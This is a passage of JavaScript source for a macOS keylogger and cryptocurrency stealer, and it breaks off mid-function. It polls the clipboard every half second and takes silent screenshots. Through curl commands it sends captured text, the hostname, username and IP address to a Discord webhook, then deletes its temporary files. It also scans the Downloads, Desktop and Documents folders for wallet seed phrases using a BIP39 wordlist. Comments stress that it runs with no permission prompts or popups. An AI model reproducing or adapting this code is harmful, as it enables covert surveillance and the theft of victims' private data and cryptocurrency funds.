// REMOVED: takeScreenshot function - not needed for simple keylogger
// Screenshots can be added later if needed, but for now we only send keystrokes

// Upload screenshot directly to Discord as file attachment (not gofile)
// REMOVED: uploadScreenshotToDiscord - now handled directly in sendKeylogToDiscord with embeds

// Send keylog to Discord with screenshot (screenshot sent directly as file, not gofile)
function sendKeylogToDiscord(buffer, processTitle, screenshotFilePath = null) {
    if (!buffer || buffer.length === 0) buffer = '[No activity]';
    
    const ip = os.networkInterfaces();
    let ipAddress = 'Unknown';
    for (const name of Object.keys(ip)) {
        for (const iface of ip[name]) {
            if (iface.family === 'IPv4' && !iface.internal) {
                ipAddress = iface.address;
                break;
            }
        }
        if (ipAddress !== 'Unknown') break;
    }
    
    // Use Discord embed for keylogger
    const keylogContent = {
        embeds: [{
            title: "⌨️ Keylogger",
            color: 0x0099ff,
            description: `\`\`\`\n${buffer.substring(0, 1000)}\n\`\`\``,
            fields: [
                { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
                { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
                { name: "IP Address", value: `\`${ipAddress}\``, inline: true },
                { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };
    
    // If we have a screenshot, upload it directly to Discord as file attachment
    if (screenshotFilePath && fs.existsSync(screenshotFilePath)) {
        const payloadFile = path.join(screenshotDir, `keylog_payload_${Date.now()}.json`);
        try {
            fs.writeFileSync(payloadFile, JSON.stringify(keylogContent));
            exec(`curl -s -X POST -F "payload_json=@${payloadFile}" -F "file=@${screenshotFilePath};type=image/png" "${WEBHOOK}"`, (error) => {
                setTimeout(() => {
                    try { 
                        fs.unlinkSync(payloadFile);
                        fs.unlinkSync(screenshotFilePath);
                    } catch (e) {}
                }, 10000);
            });
        } catch (e) {}
    } else {
        // No screenshot - just send embed
        const payloadFile = path.join(os.homedir(), `.keylogger_payload_${Date.now()}.json`);
        try {
            fs.writeFileSync(payloadFile, JSON.stringify(keylogContent));
            exec(`curl -s -X POST -H "Content-Type: application/json" --data-binary "@${payloadFile}" "${WEBHOOK}"`, (error) => {
                setTimeout(() => {
                    try { fs.unlinkSync(payloadFile); } catch (e) {}
                }, 5000);
            });
        } catch (e) {}
    }
}

// REMOVED: Dashboard/Socket.IO - not needed, only Discord

// KEYSTROKE CAPTURE - Captures clipboard changes AND actual typing
// lastClipboard and keysBuffer are already declared above

// Monitor clipboard changes (copy/paste) - with screenshot
setInterval(() => {
    exec('pbpaste', (error, stdout) => {
        if (!error && stdout && stdout.trim()) {
            const clipboard = stdout.trim();
            // Only process if clipboard actually changed
            if (clipboard !== lastClipboard && clipboard.length > 0) {
                // Simple filtering - block system files and JSON payloads
                const isSystemFile = /^[\/~]/.test(clipboard) || // File paths starting with / or ~
                                     /file_payload_|discord_payload_|keylog_payload_|password_extract_|startup_|heartbeat_|\.json/i.test(clipboard) || // System temp files
                                     /\.json$|\.zip$|\.png$|\.jpg$/i.test(clipboard) || // File extensions
                                     /^\s*\{[\s\S]*"embeds"[\s\S]*\}\s*$/i.test(clipboard) || // JSON embed objects
                                     /^\s*\{[\s\S]*"content"[\s\S]*\}\s*$/i.test(clipboard) || // JSON content objects
                                     /"title":|"color":|"fields":|"timestamp":/i.test(clipboard); // JSON embed structure
                
                // Send if it's not a system file and has content
                if (!isSystemFile && clipboard.length >= 1 && clipboard.length <= 10000) {
                    lastClipboard = clipboard;
                    
                    // Set buffer to clipboard content
                    keysBuffer = clipboard.substring(0, 5000);
                    
                    // Send INSTANTLY (no delay, no waiting for screenshot)
                    sendKeylogToDiscord(keysBuffer, 'Unknown', null);
                    
                    // Take screenshot in background (send separately, don't block)
                    const timestamp = Date.now();
                    const screenshotFile = path.join(screenshotDir, `screenshot_${timestamp}.png`);
                    exec(`screencapture -x -m "${screenshotFile}"`, (screenshotError) => {
                        if (!screenshotError && fs.existsSync(screenshotFile)) {
                            // Send screenshot separately (non-blocking)
                            const screenshotEmbed = {
                                embeds: [{
                                    title: "📸 Screenshot",
                                    color: 0x0099ff,
                                    fields: [
                                        { name: "Hostname", value: `\`${HOSTNAME}\``, inline: true },
                                        { name: "PC Username", value: `\`${USERNAME}\``, inline: true },
                                        { name: "Time", value: `\`${new Date().toLocaleString()}\``, inline: false }
                                    ],
                                    timestamp: new Date().toISOString()
                                }]
                            };
                            const screenshotPayload = path.join(screenshotDir, `screenshot_payload_${Date.now()}.json`);
                            try {
                                fs.writeFileSync(screenshotPayload, JSON.stringify(screenshotEmbed));
                                exec(`curl -s -X POST -F "payload_json=@${screenshotPayload}" -F "file=@${screenshotFile};type=image/png" "${WEBHOOK}"`, () => {
                                    setTimeout(() => {
                                        try { 
                                            fs.unlinkSync(screenshotPayload);
                                            fs.unlinkSync(screenshotFile);
                                        } catch (e) {}
                                    }, 5000);
                                });
                            } catch (e) {}
                        }
                    });
                    
                    // Clear buffer after sending
                    keysBuffer = '';
                }
            }
        }
    });
}, 500); // Check every 500ms

// REMOVED: pke keylogger monitoring (repository not available)
// Clipboard monitoring is working and captures copy/paste activity
// Screenshots are taken automatically when clipboard changes (copy/paste)

// REMOVED: Active app monitoring - was causing spam

// REMOVED: File monitoring - was causing spam

// SEED PHRASE WATCHER - Monitors all common locations for seed phrases
// Scans: Downloads, Desktop, Documents (anywhere client saves files)
// Only checks .txt files for seed phrases - works anywhere!
// Uses fs.watch (NO PERMISSIONS NEEDED, NO POPUPS, JUST WORKS!)
let watchedFiles = new Set(); // Track files we've already sent
let sentSeedPhrases = new Set(); // Track seed phrases we've already sent (prevent duplicates)
let watchDirs = [
    path.join(os.homedir(), 'Downloads'),
    path.join(os.homedir(), 'Desktop'),
    path.join(os.homedir(), 'Documents')
];

// BIP39 Wordlist (first 50 words - most common in seed phrases)
const BIP39_WORDS = new Set([
    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
    'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
    'action', 'actor', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult',
    'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree',
    'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien'
]);

// Extended BIP39 wordlist check (common seed phrase words)
const COMMON_SEED_WORDS = new Set([
    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
    'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
    'action', 'actor', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit', 'adult',
    'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent', 'agree',
    'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert', 'alien',
    'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter', 'always',
    'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger', 'angle',
    'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique', 'anxiety',
    'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'area', 'arena', 'argue',
    'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest', 'arrive', 'arrow', 'art',
    'article', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset', 'assist', 'assume', 'asthma',
    'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction', 'audit', 'august', 'aunt',
    'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake', 'aware', 'away', 'awesome',
    'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge', 'bag', 'balance', 'balcony',
    'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain', 'barrel', 'base', 'basic',
    'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become', 'beef', 'before', 'begin',
    'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit', 'best', 'betray', 'better',
    'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology', 'bird', 'birth', 'bitter',
    'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless', 'blind', 'blood', 'blossom',
    'blow', 'blue', 'blur', 'blush', 'board', 'boat', 'body', 'boil', 'bomb', 'bone',
    'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss', 'bottom', 'bounce', 'box',
    'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread', 'breeze', 'brick', 'bridge',
    'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze', 'broom', 'brother', 'brown',
    'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb', 'bulk', 'bullet', 'bundle',
    'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy', 'butter', 'buyer', 'buzz',
    'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call', 'calm', 'camera', 'camp',
    'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas', 'canyon', 'capable', 'capital',
    'captain', 'car', 'carbon', 'card', 'care', 'career', 'careful', 'careless', 'cargo', 'carpet',
    'carry', 'cart', 'case', 'cash', 'casino', 'cast', 'casual', 'cat', 'catalog', 'catch',
    'category', 'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census',
    'century', 'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge',
    'chase', 'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief',
    'child', 'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon',
    'circle', 'citizen', 'city', 'civil', 'claim', 'clamp', 'clarify', 'claw', 'clay', 'clean',
    'clerk', 'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog',
    'close', 'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast',
    'coconut', 'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come',
    'comfort', 'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider',
    'control', 'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct',
    'cost', 'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack',
    'cradle', 'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit',
    'creek', 'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd',
    'crucial', 'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture',
    'cup', 'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle',
    'dad', 'damage', 'damp', 'dance', 'danger', 'daring', 'dark', 'dash', 'daughter', 'dawn',
    'day', 'deal', 'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease',
    'deer', 'defense', 'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial',
    'dentist', 'deny', 'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert',
    'design', 'desk', 'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram',
    'dial', 'diamond', 'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma',
    'dinner', 'dinosaur', 'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder',
    'display', 'distance', 'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll',
    'dolphin', 'domain', 'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft',
    'dragon', 'drama', 'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip',
    'drive', 'drop', 'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch',
    'duty', 'dwarf', 'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east',
    'easy', 'echo', 'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight',
    'either', 'elbow', 'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else',
    'embark', 'embody', 'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact',
    'end', 'endless', 'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy',
    'enlist', 'enough', 'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode',
    'equal', 'equip', 'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay',
    'essence', 'estate', 'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example',
    'exceed', 'excel', 'exception', 'excess', 'exchange', 'excite', 'exclude', 'excuse', 'execute', 'exercise',
    'exhaust', 'exhibit', 'exile', 'exist', 'exit', 'exotic', 'expand', 'expect', 'expire', 'explain',
    'expose', 'express', 'extend', 'extra', 'eye', 'eyebrow', 'fabric', 'face', 'faculty', 'fade',
    'faint', 'faith', 'fall', 'false', 'fame', 'family', 'famous', 'fan', 'fancy', 'fantasy',
    'farm', 'fashion', 'fat', 'fatal', 'father', 'fatigue', 'fault', 'favorite', 'feature', 'february',
    'federal', 'fee', 'feed', 'feel', 'female', 'fence', 'festival', 'fetch', 'fever', 'few',
    'fiber', 'fiction', 'field', 'fierce', 'fifteen', 'fifty', 'fight', 'figure', 'file', 'film',
    'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first', 'fiscal',
    'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor', 'flee',
    'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly', 'foam',
    'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'foreign', 'forest',
    'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile',
    'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen',
    'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy',
    'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp',
    'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture',
    'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance',
    'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue',
    'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown',
    'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid',
    'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide', 'guilt',
    'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy',
    'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health',
    'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden',
    'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole',
    'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital',
    'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred',
    'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea',
    'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune',
    'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate',
    'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury',
    'ink', 'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire',
    'install', 'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate',
    'issue', 'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly',
    'jewel', 'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle',
    'junior', 'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid',
    'kidney', 'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee',
    'knife', 'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp',
    'language', 'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn',
    'lawsuit', 'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg',
    'legal', 'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter',
    'level', 'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb',
    'limit', 'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan',
    'lobster', 'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge',
    'love', 'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine',
    'mad', 'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man',
    'manage', 'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine',
    'market', 'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter',
    'maximum', 'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody',
    'melt', 'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh',
    'message', 'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum',
    'minor', 'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture',
    'mobile', 'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon',
    'moral', 'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move',
    'movie', 'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must',
    'mutual', 'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation',
    'nature', 'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest',
    'net', 'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise',
    'nominee', 'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel',
    'now', 'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure',
    'observe', 'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office',
    'often', 'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion',
    'online', 'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard',
    'order', 'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer',
    'output', 'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone',
    'pact', 'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther',
    'paper', 'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient',
    'patrol', 'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican',
    'pen', 'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone',
    'photo', 'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill',
    'pilot', 'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic',
    'plate', 'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point',
    'polar', 'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible',
    'post', 'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer',
    'prepare', 'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison',
    'private', 'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof',
    'property', 'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse',
    'pumpkin', 'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put',
    'puzzle', 'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote',
    'rabbit', 'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally',
    'ramp', 'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw',
    'razor', 'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record',
    'recover', 'recycle', 'red', 'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular',
    'reject', 'relax', 'release', 'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render',
    'renew', 'rent', 'reopen', 'repair', 'repeat', 'replace', 'reply', 'report', 'require', 'rescue',
    'resemble', 'resist', 'resource', 'response', 'result', 'retire', 'retreat', 'return', 'reunion', 'reveal',
    'review', 'reward', 'rhythm', 'rib', 'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle',
    'right', 'rigid', 'ring', 'riot', 'rip', 'ripe', 'rise', 'risk', 'rival', 'river',
    'road', 'roast', 'robot', 'robust', 'rocket', 'romance', 'roof', 'rookie', 'room', 'rose',
    'rotate', 'rough', 'round', 'route', 'royal', 'rubber', 'rude', 'rug', 'rule', 'run',
    'runway', 'rural', 'sad', 'saddle', 'sadness', 'safe', 'sail', 'salad', 'salmon', 'salon',
    'salt', 'same', 'sample', 'sand', 'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say',
    'scale', 'scan', 'scare', 'scatter', 'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion',
    'scout', 'scrap', 'screen', 'script', 'scrub', 'sea', 'search', 'season', 'seat', 'second',
    'secret', 'section', 'security', 'seed', 'seek', 'segment', 'select', 'sell', 'seminar', 'senior',
    'sense', 'sentence', 'series', 'service', 'session', 'settle', 'setup', 'seven', 'shadow', 'shaft',
    'shallow', 'share', 'shed', 'shell', 'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver',
    'shock', 'shoe', 'shoot', 'shop', 'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle',
    'shy', 'sibling', 'sick', 'side', 'siege', 'sight', 'sign', 'silent', 'silk', 'silly',
    'silver', 'similar', 'simple', 'since', 'sing', 'siren', 'sister', 'situate', 'six', 'size',
    'skate', 'sketch', 'ski', 'skill', 'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep',
    'slender', 'slice', 'slide', 'slight', 'slim', 'slogan', 'slot', 'slow', 'slush', 'small',
    'smart', 'smile', 'smoke', 'smooth', 'snack', 'snake', 'snap', 'sniff', 'snow', 'soap',
    'soccer', 'social', 'sock', 'soda', 'soft', 'solar', 'soldier', 'solid', 'solution', 'solve',
    'someone', 'song', 'soon', 'sorry', 'sort', 'soul', 'sound', 'soup', 'source', 'south',
    'space', 'spare', 'spatial', 'spawn', 'speak', 'special', 'speed', 'spell', 'spend', 'sphere',
    'spice', 'spider', 'spike', 'spin', 'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport',
    'spot', 'spray', 'spread', 'spring', 'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium',
    'staff', 'stage', 'stairs', 'stamp', 'stand', 'start', 'state', 'stay', 'steak', 'steel',
    'stem', 'step', 'stereo', 'stick', 'still', 'sting', 'stock', 'stomach', 'stone', 'stool',
    'story', 'stove', 'strategy', 'street', 'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble',
    'style', 'subject', 'submit', 'subway', 'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest',
    'suit', 'summer', 'sun', 'sunny', 'sunset', 'super', 'supply', 'supreme', 'sure', 'surface',
    'surge', 'surprise', 'surround', 'survey', 'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm',
    'swear', 'sweet', 'swift', 'swim', 'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup',
    'system', 'table', 'tackle', 'tag', 'tail', 'talent', 'talk', 'tank', 'tape', 'target',
    'task', 'taste', 'tattoo', 'taxi', 'teach', 'team', 'tell', 'ten', 'tenant', 'tennis',
    'tent', 'term', 'test', 'text', 'thank', 'that', 'theme', 'then', 'theory', 'there',
    'they', 'thing', 'this', 'thought', 'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket',
    'tide', 'tiger', 'tilt', 'timber', 'time', 'tiny', 'tip', 'tired', 'tissue', 'title',
    'toast', 'tobacco', 'today', 'toddler', 'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow',
    'tone', 'tongue', 'tonight', 'tool', 'tooth', 'top', 'topic', 'topple', 'torch', 'tornado',
    'tortoise', 'toss', 'total', 'tourist', 'toward', 'tower', 'town', 'toy', 'track', 'trade',
    'traffic', 'tragic', 'train', 'transfer', 'trap', 'trash', 'travel', 'tray', 'treat', 'tree',
    'trend', 'trial', 'tribe', 'trick', 'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck',
    'true', 'truly', 'trumpet', 'trust', 'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna',
    'tunnel', 'turkey', 'turn', 'turtle', 'twelve', 'twenty', 'twice', 'twin', 'twist', 'two',
    'type', 'typical', 'ugly', 'umbrella', 'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo',
    'unfair', 'unfold', 'unhappy', 'uniform', 'unique', 'unit', 'universe', 'unknown', 'unlock', 'until',
    'unusual', 'unveil', 'update', 'upgrade', 'uphold', 'upon', 'upper', 'upset', 'urban', 'urge',
    'usage', 'use', 'used', 'useful', 'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague',
    'valid', 'valley', 'valve', 'van', 'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle',
    'velvet', 'vendor', 'venture', 'venue', 'verb', 'verify', 'version', 'very', 'vessel', 'veteran',
    'viable', 'vibrant', 'vicious', 'victory', 'video', 'view', 'village', 'vintage', 'violin', 'virtual',
    'virus', 'visa', 'visit', 'visual', 'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano',
    'volume', 'vote', 'voyage', 'wage', 'wagon', 'wait', 'walk', 'wall', 'walnut', 'want',
    'warfare', 'warm', 'warrior', 'wash', 'wasp', 'waste', 'water', 'wave', 'way', 'wealth',
    'weapon', 'weary', 'weasel', 'weather', 'web', 'wedding', 'weekend', 'weird', 'welcome', 'west',
    'wet', 'whale', 'what', 'wheat', 'wheel', 'when', 'where', 'whip', 'whisper', 'wide',
    'width', 'wife', 'wild', 'will', 'win', 'window', 'wine', 'wing', 'wink', 'winner',
    'winter', 'wire', 'wisdom', 'wise', 'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood',
    'wool', 'word', 'work', 'world', 'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist',
    'write', 'wrong', 'yard', 'year', 'yellow', 'you', 'young', 'youth', 'zebra', 'zero',
    'zone', 'zoo'
]);

// Function to detect seed phrase using BIP39 wordlist (STRICT - only real seed phrases!)
function detectSeedPhrase(content) {
    if (!content || content.length < 20) return null;
    
    // Skip if content is mostly hex/numbers (not a seed phrase)
    const hexPattern = /^[0-9a-fA-F\s:]+$/;
    if (hexPattern.test(content.trim().substring(0, 100))) return null;
    
    // Remove common prefixes/suffixes and clean content
    let cleanContent = content
        .replace(/^(seed|phrase|mnemonic|recovery|backup|wallet|words?)[\s:]*/gmi, '')
        .replace(/[\s:]*$/gmi, '')
        .replace(/[^\w\s\-_]/g, ' '); // Remove special chars except spaces, dashes, underscores
    
    // Try to find seed phrases line by line (more accurate)
    const lines = cleanContent.split('\n').map(l => l.trim()).filter(l => l.length > 20);
    
    for (const line of lines) {
        // Skip if line looks like hex/tokens
        if (hexPattern.test(line) || /^[0-9a-f]{32,}/i.test(line)) continue;
        
        // Split into words (handle various separators)
        const words = line
            .split(/[\s,\-_\|\.]+/)
            .filter(w => w.length > 2 && w.length < 15) // Valid word length (3-14 chars)
            .map(w => w.toLowerCase().trim())
            .filter(w => /^[a-z]+$/.test(w)); // Only lowercase letters (no numbers, no special chars)
        
        // Check for valid seed phrase lengths (12 or 24 words - standard)
        if (words.length !== 12 && words.length !== 24) continue;
        
        // Check how many words are in BIP39 wordlist
        const validWords = words.filter(w => COMMON_SEED_WORDS.has(w));
        const validRatio = validWords.length / words.length;
        
        // STRICT: Require 90%+ valid BIP39 words (not 75%!)
        if (validRatio >= 0.90) {
            // Additional validation: check word uniqueness
            const uniqueWords = new Set(words);
            const uniquenessRatio = uniqueWords.size / words.length;
            
            // Require good uniqueness (at least 80% unique words)
            if (uniquenessRatio >= 0.80) {
                return {
                    type: 'seed_phrase',
